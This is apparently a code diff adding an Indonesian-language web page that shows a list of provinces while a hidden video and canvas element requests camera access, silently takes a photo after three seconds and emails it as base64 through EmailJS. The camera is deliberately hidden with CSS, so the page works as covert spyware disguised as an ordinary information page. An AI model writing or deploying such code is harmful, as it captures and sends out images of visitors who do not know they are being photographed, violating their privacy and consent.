@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Foto Otomatis & Kirim Email</title>
+  <!-- CDN EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("service_cw175cv"); // ganti dengan public key dari EmailJS
+    })();
+  </script>
+  <style>
+    video, canvas { display: none; } /* sembunyikan kamera */
+  </style>
+</head>
+<body>
+  <h2>Daftar Provinsi Indonesia</h2>
+  <ul>
+    <li>Jawa Barat</li>
+    <li>Jawa Tengah</li>
+    <li>Jawa Timur</li>
+    <li>DKI Jakarta</li>
+    <li>Banten</li>
+    <!-- ... dst -->
+  </ul>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    // Minta izin kamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        
+        // Tunggu 3 detik lalu ambil foto otomatis
+        setTimeout(() => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const imageData = canvas.toDataURL('image/png'); // hasil base64
+
+          // Kirim lewat EmailJS
+          emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+            message: "Hasil foto otomatis dari website",
+            attachment: imageData
+          })
+          .then(res => {
+            console.log("Foto berhasil dikirim!", res.status, res.text);
+          })
+          .catch(err => {
+            console.error("Gagal kirim foto", err);
+          });
+
+        }, 3000); // waktu delay 3 detik
+      })
+      .catch(err => {
+        console.error("Izin kamera ditolak", err);
+      });
+  </script>
+</body>
+</html>
